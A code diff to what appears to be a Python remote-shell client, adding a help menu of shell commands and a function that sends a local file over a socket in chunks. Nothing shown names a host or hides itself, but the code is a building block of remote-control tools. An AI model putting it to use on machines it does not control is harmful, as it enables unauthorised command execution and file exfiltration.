@@ -1,5 +1,6 @@
 import subprocess
 import os
+import time
 
 
 w = ["Windows", "windows", "win", "Win"]
@@ -42,3 +43,33 @@ def execute(os,cmd):
             return "executed"
     except FileNotFoundError:
         return f"Command not found: {command}"
+def help():
+    print("""Available Commands:
+    -------------------
+    1. ls  - List files and directories in the current directory.
+   
+    2. cd <directory> - Change the current working directory.
+   - <directory>: The directory to change to (e.g., 'cd /home/user').
+
+    3. pwd - Print the current working directory.
+
+    4. execute <command> - Execute a system command.
+        - <command>: The command to execute (e.g., 'execute Linux ls -l').
+
+    5. help - Display this help message with a list of available commands.
+    """)
+def download(s,file,chunk_size):
+    try:
+        with open(file,"rb") as f:
+            while True:
+                chunk=f.read(chunk_size)
+                if not chunk:
+                    
+                    break
+                s.send(chunk)
+            s.send(b"EOF")
+        time.sleep(0.2)
+        return "executed"
+    except:
+
+        return "error"
